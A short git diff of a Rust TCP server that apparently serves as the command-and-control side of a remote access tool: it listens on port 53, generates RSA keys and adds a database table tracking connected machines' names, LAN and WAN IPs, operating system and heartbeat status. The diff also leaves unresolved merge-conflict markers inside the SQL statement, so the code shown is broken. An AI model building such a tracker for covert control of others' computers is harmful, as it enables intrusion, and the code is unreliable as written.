@@ -192,7 +192,7 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
 #[tokio::main]
 async fn main() -> io::Result<()> {
     let (chann_snd, mut _chann_rcv)  = broadcast::channel(64);
-    let listener = TcpListener::bind("192.168.1.109:53").await?;
+    let listener = TcpListener::bind("192.168.1.41:53").await?;
     // Generate priv and pub key of server
     let mut rng = OsRng;
     let bits = 2048;
@@ -274,9 +274,19 @@ async fn main() -> io::Result<()> {
         conn.execute(
             "CREATE TABLE user (
                 id INTEGER PRIMARY KEY,
+<<<<<<< HEAD
                 name TEXT,
                 ip TEXT,
                 autre TEXT);",NO_PARAMS,);
+=======
+                computername TEXT,
+                lanip TEXT,
+                wanip TEXT,
+                os TEXT,
+                lastseen TEXT,
+                hbstatus TEXT);",NO_PARAMS);           
+                
+>>>>>>> 38c4b23 (come modifications)
             }
         
         let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
